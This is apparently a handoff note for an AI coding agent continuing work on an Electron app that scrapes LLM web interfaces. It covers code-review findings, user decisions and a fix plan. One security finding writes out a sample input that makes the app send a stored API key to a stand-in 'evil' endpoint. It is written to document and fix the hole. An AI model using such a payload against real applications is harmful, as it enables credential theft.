# Handoff: Pre-release Code Review + Partial Fixes (2026-10-20)

Written for the next agent picking up LLM Explorer. It covers the review findings, the decisions the user made, the exact state of the working tree, and the fix plan that was approved before the user changed direction. Line numbers refer to HEAD `db5f2d7` ("Phase 2: The Onboarding Setup Wizard"). `main.js`, `scrapers.js`, `preload.js` and `index.html` are **unchanged** from that commit, so the line numbers are still valid.

---

## 1. Current working-tree state (uncommitted)

Work stopped partway through **Step A** (bundle Chromium). These changes exist:

| File | Change |
|---|---|
| `scripts/install-browsers.js` | **New.** Runs `playwright/cli.js install --no-shell chromium` with `PLAYWRIGHT_BROWSERS_PATH=<repo>/pw-browsers`. Tested; exits 0. |
| `package.json` | `postinstall` and a new `prebuild:win` both run `node scripts/install-browsers.js`. Added `build.extraResources`: `pw-browsers` → `ms-playwright`, filter `chromium-*/**`, `winldd-*/**`. |
| `.gitignore` | Added `pw-browsers/`. |
| `pw-browsers/` | Local only (gitignored). Holds `chromium-1248`, `ffmpeg-1013` and `winldd-1007`, copied from `%LOCALAPPDATA%\ms-playwright`, so no download was needed. |

**⚠ Step A is only half done.** The installer would now *contain* Chromium, but nothing tells Playwright to *use* it, so a clean machine still fails. The missing piece goes at the top of `scrapers.js`, **before** `require('playwright')`. Playwright reads the variable once, on first require:

```js
const { app } = require('electron');
const path = require('path');
const fs = require('fs');

if (app && app.isPackaged) {
  process.env.PLAYWRIGHT_BROWSERS_PATH = path.join(process.resourcesPath, 'ms-playwright');
} else if (!process.env.PLAYWRIGHT_BROWSERS_PATH && fs.existsSync(path.join(__dirname, 'pw-browsers'))) {
  process.env.PLAYWRIGHT_BROWSERS_PATH = path.join(__dirname, 'pw-browsers');
}
const { chromium } = require('playwright');
```

`main.js:5` also requires `playwright`, and it loads before `scrapers.js` (`main.js:6`). Remove that line and move Login Mode's launch into `scrapers.js` (see Step A below), so that one module owns Playwright.

**To revert instead:** `git checkout package.json .gitignore`, then delete `scripts/install-browsers.js` and `pw-browsers/`.

---

## 2. Verified facts (checked, not guessed)

- **The packaged app has no browser.** Listing `dist/win-unpacked/resources/app.asar` shows `playwright-core` (135 files), 0 browser binaries, and 0 animejs files. The old `postinstall` (`npx playwright install chromium`) only installed into the dev machine's `%LOCALAPPDATA%\ms-playwright`, which is why the `.exe` works on the dev PC but not on a stakeholder's.
- **Playwright version:** 1.64.1, which expects `chromium-1248` (Chrome for Testing 156.0.8078.4). It resolves the browser folder from `PLAYWRIGHT_BROWSERS_PATH` once, at module load (`node_modules/playwright-core/lib/coreBundle.js` ~line 34465).
- **winldd must ship too.** At launch, Playwright re-validates Windows DLL dependencies with `winldd` (PrintDeps.exe) whenever the `DEPENDENCIES_VALIDATED` marker is older than 30 days (`coreBundle.js` ~34979, called from launch ~41204). Without `winldd-*`, scraping would start failing about 30 days after a build.
- **Anime.js isn't installed anywhere.** It's missing from `package.json`, `node_modules` and the asar. `index.html:7` loads a missing file, and every animation silently no-ops because of the `window.anime?.animate` guard (`index.html:1103`).
- **`synthesize.py` is outside the repo.** It lives at `C:\llm\src\synthesize.py`, and the Local engine depends on hard-coded `C:\llm\...` paths plus a separate OVMS server.
- **Earlier audit:** `docs/phase-3.5-audit.md` items still open: B7, B8, 1.1, 1.2, 1.3, 3.2, 3.3, 6.2.

---

## 3. User decisions (answered during the review)

1. **Browser:** bundle Playwright's Chromium in the installer (not system Edge).
2. **Prefix, slider and History Context controls:** wire them up so they actually affect prompts.
3. **Local GPU engine:** Cloud (DeepSeek) is the default; Local GPU only appears when the Python env and script exist.
4. **Persistence:** save conversations to `userData/conversations/*.json`.

---

## 4. Review findings

The main-process architecture is sound: registry merge, adapter/dispatcher split, turnId routing, the write-only safeStorage key store, keyed rendering, and `textContent` everywhere (scraped text can't inject HTML). The problems are at the edges.

| # | Severity | Finding | Where |
|---|---|---|---|
| F1 | Blocker | No browser in the installer (see §2) | `package.json`, `scrapers.js:38` |
| F2 | Blocker | Onboarding "Cloud" saves the key but never calls `setEngine('Cloud')`. Both selects and main default to Local GPU, so the first prompt opens the OVMS modal | `index.html:368,397,2536`, `main.js:752` |
| F3 | Blocker | Onboarding presents Cloud *vs* scrapers, but DeepSeek only **synthesizes**: sources are always the checked providers (Brave and Google via Playwright). The Cloud card copy ("no browser automation") is wrong | `index.html:441-478` |
| F4 | Blocker | Local engine paths are hard-coded to `C:\llm\...` | `main.js:8-9` |
| F5 | High | Anime.js missing (see §2) | `index.html:7` |
| F6 | High | Prefix, detail sliders, master slider, trio toggle, max tokens, fidelity and History Context depth never reach any model. `dispatchPrompt` sends only `{turnId, promptText, activeModels, engine}` | `index.html:2589-2597` |
| F7 | High | The synthesizer never receives the user's question. Sources are labeled "SOURCE n" with no model names | `main.js:563-571`, `main.js:440` |
| F8 | Med | Status/error lines (`[Cloud API synthesis…]`, `[Brave: Error…]`) are streamed into `hybrid.text` and exported as the "Hybrid Synthesis". Each non-loading reply resets the text to "Synthesizing...", which wipes earlier notices. `hybrid.log` exists but is unused | `index.html:2689-2706`, `main.js:739` |
| F9 | Med | Fake signals: `hybrid.score = 100`; the progress ticker decrements with `Math.random()`; there's one global `inflight` across turns; Retry, Sync, Prefix, Hybrid and Free APIs have no handlers | `index.html:2252,2729,362-366` |
| F10 | Med | Troubleshoot Retry and Use-Cloud resend `lastPrompt` (whatever was typed last), not the failed turn's prompt | `index.html:2645-2665` |
| F11 | Low | Stream auto-scroll goes to `scrollHeight`, but the newest turn renders at the top | `index.html:2157,2713` |
| F12 | **Security** | `buildProviderConfig` accepts a renderer-supplied `keyRef`. `{kind:'api', endpoint:'https://evil', keyRef:'deepseek'}` makes main send the DeepSeek key to that endpoint. This must be fixed before the Phase 3 templates or any JSON import | `main.js:160` |
| F13 | Security | Scrapes launch with `--no-sandbox` and a hard-coded `Chrome/120` UA that doesn't match the real browser. Login Mode launches with different options on the same profile | `scrapers.js:41-42`, `main.js:936` |
| F14 | Security | No `will-navigate` or `setWindowOpenHandler` guard. Dropping a file on the window navigates away, and the new page inherits `window.api` | `main.js:390` |
| F15 | Robustness | The same provider in overlapping turns, or Login Mode during a scrape, opens the same profile twice, and Chromium's profile lock fails the second. The browser cap (3) is per turn, not global | `main.js:404,793` |
| F16 | Resources | `before-quit` kills Python but not Playwright contexts, so browsers can be orphaned. `context.close()` in `finally` has no `.catch` | `main.js:967`, `scrapers.js:152` |
| F17 | Robustness | No logged-out detection (it surfaces as a cryptic 15 s timeout). `doneSelector` is null everywhere, so completion relies only on 3 s of unchanged text. Brave's `pre, code, .markdown` + `.last()` likely grabs the last code block. Google's `div[role="main"]` count likely never increases | `providers.json`, `scrapers.js` |
| F18 | Product | Conversations are memory-only and lost on close | `index.html:1626` |
| F19 | Latent | `row._maxPulse` isn't reverted when `renderLeft` removes a row (it will leak once Anime.js loads). Re-entering `showAppModal` leaves a dangling keydown listener | `index.html:1526,746` |
| — | Info | `DEMO_PROVIDERS` (10 models) no longer matches `providers.json` (3). The trio toggle targets `perplexity` and `meta`, which are now templates | `index.html:495`, `1612` |
| — | Info | Scraped web text feeds the synthesis prompt, a prompt-injection surface. The impact is low because the output is display-only | — |
| — | Release risk | Automating ChatGPT, Claude, Gemini and similar web UIs typically goes against those services' terms. Stakeholder accounts could be flagged | — |

**Memory leaks:** there are no significant heap leaks. `turnEls`, `leftRows` and `activeChildren` are pruned, and IPC listeners are registered once. The real risk is leftover **browser processes** (F15, F16).

---

## 5. Approved fix plan (remaining work)

Order: finish A → B → C (blockers + security), then E → D → F → G → H.

**A. Bundle Chromium + one launch helper** (F1, F13, F15, F16). *Partially done; see §1.*
- Set the runtime env var in `scrapers.js` (snippet in §1). Remove `require('playwright')` from `main.js`.
- `scrapers.js`: export `launchContext(id, opts)`, used by both scraping and Login Mode. Remove `--no-sandbox` and the custom `userAgent`. Use `context.pages()[0] || newPage()` instead of always opening a second tab.
- Add a per-provider lock (`Map<id, Promise>` chain) that both scraping and Login Mode take. Add one module-level semaphore of 3 browsers for scrapes, shared across all turns (take the provider lock first, then the slot). Replace `runConcurrent` in `main.js` with `Promise.allSettled(tasks.map(t => t()))`. API calls aren't throttled.
- Track open contexts in a `Set` and export `closeAll()` plus an `isShuttingDown()` flag. `launchContext` refuses new launches while shutting down, and the Login Mode loop stops.
- `main.js` `before-quit`: on the first call, `preventDefault`, kill the Python children, `await Promise.race([scrapers.closeAll(), 5 s])`, then `app.exit(0)`.
- Add `.catch(() => {})` on `context.close()`.

**B. Engine defaults + onboarding** (F2, F3, F4)
- Add IPC `engine:status` → `{ localAvailable: existsSync(PYTHON_EXE) && existsSync(PYTHON_SCRIPT_PATH) }` and expose it in `preload.js`. Change the main default engine to `'Cloud'`.
- `index.html`: make Cloud `selected` in both selects. Hide the Local options when they're unavailable, and fall back to Cloud if the saved preference is Local.
- Onboarding becomes two steps, not a choice: ① the synthesis engine (DeepSeek key → `setEngine('Cloud')`), ② sources (Brave and Google need no login; Login Mode is for account sites). Fix the copy.

**C. Security** (F12, F14)
- In `buildProviderConfig`, ignore `input.keyRef`: API providers always get `provider:<id>`, and an edit keeps `base.keyRef` only if it starts with `provider:`.
- In `createWindow`: `webContents.on('will-navigate', e => e.preventDefault())` and `setWindowOpenHandler(() => ({ action: 'deny' }))`.

**E. Synthesis inputs + hybrid state** (F7, F8, F10, F11)
- Pass `[{ id, name, text }]` and the **original** `promptText` to `buildSynthesisPrompt(question, sources)`, with `--- SOURCE: <name> ---` labels. Python gets a JSON line `{question, sources}`. This needs a matching `synthesize.py` change, so keep the old stdin format behind a flag until then.
- Add a new `hybrid-log` IPC (preload `onHybridLog`) for status and error lines. The renderer appends them to `turn.hybrid.log` and shows them under the hybrid body. Placeholders render from `hybrid.status`, never written into the text. The export gets a separate log section.
- Troubleshoot Retry and Use-Cloud read `convo.nodes[lastEngineErrorTurnId]` (`.prompt`, `.order`, `.parentId`).
- Auto-scroll: `turnEl.scrollIntoView({ block: 'nearest' })`.
- Drop the hard-coded score of 100 and hide the score bar unless a real score exists.

**D. Wire prompt shaping** (F6, F9)
- In the renderer, `buildModelPrompt(ch, promptText, parentId)` assembles three parts:
  - the prefix (`getPrefixText(ch)`), when the `prefixToggleBtn` toggle is on (persist its state in `llmx.uiPrefs`);
  - "Aim for roughly N words", where `budget = value * 10` tokens (the same meaning `estimateSend` already uses) and N ≈ budget × 0.75; skip this line for static rows;
  - the last `hsRange` turns of the path to `parentId`, as `User:` / `Answer:` lines.
- Send `perModelPrompts` and `maxTokensById`. Main validates them and uses `perModelPrompts[id] ?? promptText`. API providers send `max_tokens`.
- Wire Retry to rerun the active leaf as a sibling. Hide Sync, Hybrid and Free APIs. Retarget or hide the trio toggle.
- Drive progress from real `reply-received` and `hybrid-complete` events per turnId.

**F. Persistence** (F18)
- Add IPC `convo:load-last`, `convo:save`, `convo:new`. Files go to `userData/conversations/<id>.json`, written atomically (tmp + rename). `last.json` points at the current conversation.
- In the renderer, a `store` abstraction (IPC in Electron, localStorage in the demo) saves with a ~500 ms debounce, never per stream chunk. On load, unfinished turns are marked `interrupted`. `clearChat` → `convo:new`.

**G. Scraper hardening** (F17)
- Optional per-provider `loggedOutSelector` / `loggedOutUrlPattern`, which returns "Not signed in — run Login Mode".
- Fix the Brave and Google selectors against the **live sites**; this can't be verified statically. Add stop-button `doneSelector`s to `templates.json` as each one is validated.

**H. Anime.js + cleanups** (F5, F19)
- Install `animejs@4` (the code uses the v4 `anime.animate` API). Vendor `dist/bundles/anime.umd.min.js` into `vendor/`, point `index.html:7` at it, and add `vendor/**` to `build.files` so it also works on GitHub Pages.
- Call `stopMaxPulse(row)` before `row.remove()` in `renderLeft`. `showAppModal` closes any open instance first. Make `DEMO_PROVIDERS` match `providers.json` + `templates.json`.

---

## 6. Verification checklist

- **Packaging:** `npm run build:win`. Confirm `dist/win-unpacked/resources/ms-playwright/chromium-1248` and `winldd-1007` exist. Rename `%LOCALAPPDATA%\ms-playwright`, or use a separate Windows account, then run Login Mode and a Brave scrape from the installed `.exe`.
- **Onboarding:** clear `llmx.onboarded` and `llmx.engine.v1`, take the Cloud path, and send a prompt. It must synthesize via DeepSeek with no OVMS modal. Rename `C:\llm\ov_env` and check that Local is hidden.
- **Concurrency:** two rapid sends with the same provider → no profile-lock error, ≤3 browsers. Quit mid-scrape → no orphan `chrome.exe`.
- **Security:** `api.addProvider({kind:'api', name:'x', endpoint:'https://example.com', modelId:'m', keyRef:'deepseek'})` → the stored `keyRef` is `provider:x`. A dropped file doesn't navigate the window.
- **Persistence:** 2 turns + a fork, restart → the tree and active branch are restored.
- **Demo:** opening `index.html` in a plain browser still runs demo mode.

---

## 7. Notes for whoever continues

- The Local engine's input format (step E) can't be finished without editing `C:\llm\src\synthesize.py`, which is outside this repo.
- Brave, Google and template selectors have to be checked in a real browser session; their current values are guesses carried over from earlier code.
- `docs/phase-3.5-audit.md` has fuller background on the warm browser contexts (1.1), the warm Python worker (3.1) and the persistence format (Pillar 4).
